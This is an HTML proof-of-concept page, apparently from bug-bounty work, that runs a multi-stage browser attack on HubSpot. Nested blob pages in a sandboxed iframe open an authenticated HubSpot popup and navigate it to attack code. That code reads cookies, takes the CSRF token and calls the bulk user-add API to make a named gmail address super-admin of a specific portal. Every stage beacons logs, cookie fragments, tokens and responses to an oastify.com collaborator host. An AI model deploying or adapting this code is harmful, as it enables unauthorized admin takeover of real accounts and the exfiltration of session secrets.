<!DOCTYPE html>
<html>
<head><title>Relay</title></head>
<body>
<h1>Relay - Add Super Admin Attack</h1>
<div id="status"></div>
<script>
const EXFIL = 'https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com';

function log(msg) {
    document.getElementById('status').innerHTML += '<br>' + msg;
    new Image().src = EXFIL + '/?log=' + encodeURIComponent(msg);
}

window.addEventListener('message', function(e) {
    if (e.data && e.data.action === 'startExploit') {
        log('TRIGGERED');
        
        const blob = new Blob([`
<html>
<body>
<h2>Adding Super Admin</h2>
<div id="log" style="font-family:monospace;font-size:11px;background:#000;color:#0f0;padding:10px;max-height:350px;overflow:auto;"></div>
<script>
const E = 'https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com';

function l(m) { 
    const d = document.getElementById('log');
    d.innerHTML += '<br>' + m;
    d.scrollTop = d.scrollHeight;
    new Image().src = E + '/?s=' + encodeURIComponent(m); 
}

l('START_origin=' + window.origin);

// First, open HubSpot to establish session
l('opening_hubspot');
let hub = window.open('https://app-eu1.hubspot.com', 'hub', 'width=900,height=700');

if (!hub) {
    l('ERROR_blocked');
} else {
    l('popup_opened');
    
    let attempts = 0;
    setInterval(() => {
        attempts++;
        try {
            hub.origin;
        } catch(e) {
            if (attempts === 1) {
                l('hubspot_loaded');
                
                // Now create an attack page that will make the API call
                setTimeout(() => {
                    l('creating_attack_page');
                    
                    // Create a page that will use fetch() to make the API call
                    const attackPageBlob = new Blob([\`
<html>
<head><title>Attack</title></head>
<body>
<h2>Executing Attack...</h2>
<div id="result"></div>
<script>
const E = 'https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com';

function log(m) {
    document.getElementById('result').innerHTML += '<br>' + m;
    new Image().src = E + '/?attack=' + encodeURIComponent(m);
}

log('attack_page_loaded');
log('origin=' + window.origin);
log('cookies=' + document.cookie.substring(0, 100));

// Try to extract CSRF token from cookies
const csrfMatch = document.cookie.match(/hubspotapi-csrf=([^;]+)/);
const csrfToken = csrfMatch ? csrfMatch[1] : null;

if (csrfToken) {
    log('CSRF_TOKEN_FOUND=' + csrfToken.substring(0, 20));
} else {
    log('ERROR_no_csrf_token');
}

// Attempt the API call
setTimeout(() => {
    log('making_api_call');
    
    const payload = {
        users: [{
            email: "chorfimajd22@gmail.com",  // CHANGE THIS!
            roleNames: ["super-admin"],
            seatNames: ["core"],
            firstName: "",
            lastName: "",
            permissionSetIds: []
        }],
        roleNames: ["super-admin"],
        seatNames: ["core"],
        permissionSetIds: [],
        secondaryTeamIds: [],
        forceWelcomeEmail: false,
        sendSlackInvite: false,
        sendWelcomeEmail: false
    };
    
    const url = 'https://app-eu1.hubspot.com/api/app-users/v1/users/add/bulk?portalId=146256700&clienttimeout=14000';
    
    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-Hubspot-Csrf-Hubspotapi': csrfToken || ''
        },
        credentials: 'include',
        body: JSON.stringify(payload)
    })
    .then(response => {
        log('response_status=' + response.status);
        
        if (response.ok) {
            log('SUCCESS_USER_ADDED!');
            new Image().src = E + '/?SUCCESS=user_added';
            return response.json();
        } else {
            log('FAILED_status=' + response.status);
            return response.text();
        }
    })
    .then(data => {
        log('response=' + JSON.stringify(data).substring(0, 200));
        new Image().src = E + '/?response=' + encodeURIComponent(JSON.stringify(data).substring(0, 500));
    })
    .catch(err => {
        log('ERROR=' + err.message);
        new Image().src = E + '/?error=' + encodeURIComponent(err.message);
    });
    
}, 1000);
<\\/script>
</body>
</html>
                    \`], {type: 'text/html'});
                    
                    const attackUrl = URL.createObjectURL(attackPageBlob);
                    l('attack_url_created');
                    
                    // Navigate the authenticated HubSpot window to our attack page
                    hub.location = attackUrl;
                    l('navigated_to_attack_page');
                    
                }, 2000);
            }
        }
    }, 100);
}
<\/script>
</body>
</html>
        `], {type: 'text/html'});
        
        const blobUrl = URL.createObjectURL(blob);
        
        const iframe = document.createElement('iframe');
        iframe.sandbox = 'allow-scripts allow-popups allow-popups-to-escape-sandbox';
        iframe.src = blobUrl;
        iframe.style.cssText = 'width:100%;height:400px;border:3px solid red';
        
        document.body.appendChild(iframe);
        log('iframe_added');
    }
});

if(window.opener) {
    window.opener.postMessage({status:'ready'},'*');
}
</script>
</body>
</html>
